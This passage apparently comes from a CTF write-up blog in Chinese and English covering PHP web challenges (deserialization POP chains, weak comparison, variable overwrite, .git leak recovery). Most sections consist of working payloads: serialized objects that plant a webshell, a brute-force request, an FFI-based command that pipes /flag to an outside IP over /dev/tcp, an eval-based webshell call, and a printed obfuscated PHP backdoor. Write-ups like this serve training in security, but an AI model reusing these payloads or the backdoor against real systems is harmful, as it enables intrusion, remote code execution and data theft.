<li>要触发<code>upload_img</code>函数，必须要通过<code>Profile</code>类的<code>__get</code>或者<code>__call</code></li>
<li>要触发反序列化漏洞，肯定要注册register 类</li>
<li>我们的cookie传进对面的Index.php中时，经过反序列化，会生成一个register类并且生存期只有那一行，必然触发<code>__destruct</code>函数。</li>
<li><code>__destruct</code>函数会触发checker的<code>index()</code>方法。假定<code>checker</code> 是<code>profile</code>类，但是index()在<code>profile</code>类中不存在，所以会执行<code>__call</code> 方法，<code>__call()</code>方法又会触发<code>__get()</code>，<code>__get()</code>返回Profile类的<code>except[$name]</code>，并在<code>__call()</code>中被当做方法执行（而且argument为空）</li>
<li>因此，<code>except[$name]</code>应该得是<code>upload_img</code>，而且那个<code>$name</code>就是<code>index</code>，因此，<code>$this-&gt;except = array(&#39;index&#39; =&gt; &#39;upload_img&#39;);</code></li>
<li><code>filename_tmp</code>是之前上传的图片马，<code>filename</code>是我们要拷贝到的php文件名</li>
</ul>
</li>
</ul>
<p>最终payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$test = new Profile();</span><br><span class="line">$test -&gt; checker = 0;</span><br><span class="line">$test -&gt; except = array(&apos;index&apos; =&gt; &apos;upload_img&apos;);</span><br><span class="line">$test -&gt; filename_tmp = &quot;./upload/08856017fa6b6b422db719c5519123dc/6d801eac2d3e2a4c8fa1c1ff256902a9.png&quot;;</span><br><span class="line">$test -&gt; filename = &quot;./upload/08856017fa6b6b422db719c5519123dc/gg.php&quot;;</span><br><span class="line">$test -&gt; ext = 1;</span><br><span class="line"></span><br><span class="line">$a = new Register();</span><br><span class="line">$a -&gt; checker = $test;</span><br><span class="line">$a -&gt; registed = 0;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">// var_dump($exp);</span><br><span class="line">echo $exp;</span><br></pre></td></tr></table></figure>

<p>然后用蚁剑连接就可以了。</p>
<h2 id="p4队伍出的一道题"><a href="#p4队伍出的一道题" class="headerlink" title="p4队伍出的一道题"></a>p4队伍出的一道题</h2><p>进入网站之后拿到bak文件，用sublime打开。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">        <span class="comment">//0xC0二进制是：1100 0000</span></span><br><span class="line">        <span class="comment">//64  二进制是：0100 0000</span></span><br><span class="line">        <span class="comment">//0 0 0 64 64 64 0 64 0 0 64 0 0 0 64 64 64 64 0 0 0 64 0 0 64 0 64 0 64 64 0 0 </span></span><br><span class="line">        <span class="comment">//1 1 1 A  A  A  1 A  1 1 A  1 1 1 a  a  a  a  1 1 1 a  1 1 a  1 a  1 a  a  1 1</span></span><br><span class="line">        <span class="comment">//6 7 6 4  c  d  f 9  f 2 7  3 2 f 2  f  2  3  b 7 5 2  b f f  7 6  c 9  0  1 7 </span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>

<p>随便传入什么东西，注意hash的冒号后面有一个空格不要忽视。<br>弹出来的hint拿来分析。<br>根据我写的注释，结合二进制的与运算，我们只能知道零位代表数字，64代表字母。</p>
<p>注意到<code>if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {</code>是弱类型比较。</p>
<p>参考小西师傅的博客，知道了头三位是数字，那么只要爆破头三位就可以了。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /admin/login.php HTTP/1.1</span><br><span class="line">Host: gameserver.zajebistyc.tf</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __cfduid=df075e1e270efb9af840cfbcfcea51b6b1552736385;otadmin=&#123;&quot;hash&quot;: §111§&#125;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>

<p>然后为payload设置number类型，起点100终点999步长为1，跑一下就可以了，最终flag:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p4&#123;wtf_php_comparisons_how_do_they_work&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2019-RCTF-nextphp"><a href="#2019-RCTF-nextphp" class="headerlink" title="2019 RCTF nextphp"></a>2019 RCTF nextphp</h2><p>After <code>phpinfo()</code>, we can notice the versionn is <code>php 7.4</code> ,and a new feature <code>ffi</code> was enabled .</p>
<blockquote>
<p>FFI is one of the features that made Python and LuaJIT very useful for<br>fast prototyping. It allows calling C functions and using C data types<br>from pure scripting language and therefore develop “system code” more<br>productively. For PHP, FFI opens a way to write PHP extensions and<br>bindings to C libraries in pure PHP. </p>
</blockquote>
<p><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a> alse give an example:</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &lt;?php</span><br><span class="line">&gt; // create FFI object, loading libc and exporting function printf()</span><br><span class="line">&gt; $ffi = FFI::cdef(</span><br><span class="line">&gt;     &quot;int printf(const char *format, ...);&quot;, // this is regular C declaration</span><br><span class="line">&gt;     &quot;libc.so.6&quot;);</span><br><span class="line">&gt; // call C printf()</span><br><span class="line">&gt; $ffi-&gt;printf(&quot;Hello %s!\n&quot;, &quot;world&quot;);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>And using <code>var_dump()</code> , we got source code as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mix the two array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unserialize the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the ith data in $data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __set ($key, $value) &#123;</span></span><br><span class="line">        <span class="comment">// throw new \Exception('No implemented');</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __construct () &#123;</span></span><br><span class="line">        <span class="comment">// throw new \Exception('No implemented');</span></span><br><span class="line">    <span class="comment">/* &#125; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>generate serialized string and sent it to target as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a=unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;);$a-&gt;ret-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/207.148.64.125/9991&quot;&apos;);</span><br></pre></td></tr></table></figure>

<h2 id="ichunqiu-Hash"><a href="#ichunqiu-Hash" class="headerlink" title="ichunqiu Hash"></a>ichunqiu Hash</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'Gu3ss_m3_h2h2.php'</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">"Gu3ss_m3_h2h2.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>__wakeup</code> function will be called automatically when <strong>unserialize happen</strong> .In order to bypass the limitation, first , replace <code>O:4:</code> to <code>O:+4:</code> to bypass Regular expression. Second, <strong>increase the number of parameter in serialize string</strong> to bypass <code>__wakeup</code> function (keep silient when the parameter number is wrong).</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'f15g_1s_here.php'</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Demo();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">$a = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">':1:'</span>,<span class="string">':2:'</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>

<p>And there is a trap which is noteable enough,  the serialized string that be eched in our payload shows as follow:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>See something strange? **”Demofile” has 8 character , but it shows there are 10 characters , which, indicates that it contains some Invisible characters . It was the reason why copy the echod string directly and got it in base64-encode did not word. **</p>
<p>and <code>f15g_1s_here.php</code> ‘ s contents are as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'val'</span>])) &#123;</span><br><span class="line">    $val = $_GET[<span class="string">'val'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'$value="'</span> . addslashes($val) . <span class="string">'";'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hahaha!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?val=$&#123;@eval($_POST[0])&#125;</span><br><span class="line">Post data: 0=phpinfo();</span><br><span class="line">0=echo `ls`</span><br><span class="line">0=echo `cat True_F1ag_i3_Here_233.php`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ps: <strong>`</strong> actully call shell_exec() function</p>
</blockquote>
<h2 id="ichunqiu-try"><a href="#ichunqiu-try" class="headerlink" title="ichunqiu try"></a>ichunqiu try</h2><p>finally got source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_GET[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_POST[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_COOKIE[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]==<span class="string">'yes'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'not admin'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>and our payload is :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/Get_Fl3g_e165421110ba03099a1c0393373c5b43.php?_SERVER[_SESSION][admin]=yes</span><br></pre></td></tr></table></figure>

<p>so , from the payload above , there is one thing to be true: <strong>when $_GET as $key =&gt; $value was executed , the variable $_SERVER has already generated.</strong></p>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>看源码拉到下面有密码，登陆抓包，看见有个参数<code>show</code>，然后修改他的值从0变成1，发送，得到源代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include &apos;common.php&apos;;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	class db</span><br><span class="line">	&#123;</span><br><span class="line">		public $where;</span><br><span class="line">		function __wakeup()</span><br><span class="line">		&#123;</span><br><span class="line">			if(!empty($this-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				$this-&gt;select($this-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		function select($where)</span><br><span class="line">		&#123;</span><br><span class="line">			$sql = mysql_query(&apos;select * from user where &apos;.$where);</span><br><span class="line">			return @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($requset[&apos;token&apos;]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));</span><br><span class="line">		$db = new db();</span><br><span class="line">		$row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;);</span><br><span class="line">		if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo $flag;</span><br><span class="line">		&#125;else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;])&#123;</span><br><span class="line">			echo &apos;unserialize injection!!&apos;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		header(&apos;Location: index.php?error=1&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发送的东西如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;);</span><br><span class="line">echo base64_encode(gzcompress(serialize($a)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>添加到请求头cookie中的token中发送得到flag</p>
<h2 id="backdoor-ichunqiu"><a href="#backdoor-ichunqiu" class="headerlink" title="backdoor (ichunqiu)"></a>backdoor (ichunqiu)</h2><p>首先根据题目提示，查看是否有敏感信息泄露，访问<code>flag.php</code>无果，然后分别用<code>7kbscan</code>和<code>王一航</code>的脚本去扫描，发现有<code>.git</code>文件泄露，但是王的脚本显示访问.git的时候显示<code>403</code>，意味着文件存在但是拒绝访问，但是其他.git文件夹下的文件显示200可以访问。</p>
<p>因此可以使用<code>dvcs-ripper</code>来获取<code>.git</code>文件，这个工具和<code>githack</code>的不同之处在于，前者除了下载文件之外还能回滚回去之前的版本，而后者却不能。使用用法看看<code>readme.md</code>就知道啦。</p>
<p>下载完之后其中有一个<code>flag.php</code>，然后使用<code>git log flag.php</code>来看这个文件的历史版本，显示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">commit da06087a0b893ddb6b6c857e53ce4387c96785ab           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:13:16 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:09:53 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    test                                                  </span><br><span class="line">                                                          </span><br><span class="line">commit 494a75f8b3c397e8da52e3ff82ddc4bf1bc47f17           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:07:47 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">:...skipping...                                           </span><br><span class="line">commit da06087a0b893ddb6b6c857e53ce4387c96785ab           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:13:16 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:09:53 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    test                                                  </span><br><span class="line">                                                          </span><br><span class="line">commit 494a75f8b3c397e8da52e3ff82ddc4bf1bc47f17           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:07:47 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 1556a1d651526780ecd22db22681619e4ce6aa4b           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:58:51 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 734d08bfd094afa3372b997bf1c71412c1afc7d9           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:58:44 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 25a4a898b1a45412a538a7baa868bc406c1d8ba9           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:55:18 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    added web app</span><br></pre></td></tr></table></figure>

<p>然后使用命令<code>git diff 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88</code>来查看之前一个版本的文件。发现<code>flag{true_flag_is_in_the_b4cko0r.php}</code>。</p>
<p>然后尝试访问<code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/b4ckdo0r.php</code>，页面提示要我们去找源码。</p>
<p>然后我们尝试</p>
<p><code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/.b4ckdo0r.php.swp</code><br>和<code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/.b4ckdo0r.php.swo</code>来看看是否有文件备份。发现swo可以。</p>
<p>下载下来之后使用命令<code>vim -r b4ckdo0r.php.swo</code>来还原，得到以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;can you find the source code of me?&quot;;</span><br><span class="line">/**</span><br><span class="line"> * Signature For Report</span><br><span class="line"> */$h=&apos;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&apos;;/*</span><br><span class="line"> */$H=&apos;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&apos;;/*</span><br><span class="line"> */$N=&apos;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&apos;;/*</span><br><span class="line"> */$u=&apos;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&apos;;/*</span><br><span class="line"> */$f=&apos;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&apos;;/*</span><br><span class="line"> */$O=&apos;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&apos;;/*</span><br><span class="line"> */$w=&apos;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&apos;;/*</span><br><span class="line"> */$P=&apos;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3&apos;;/*</span><br><span class="line"> */$i=&apos;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&apos;;/*</span><br><span class="line"> 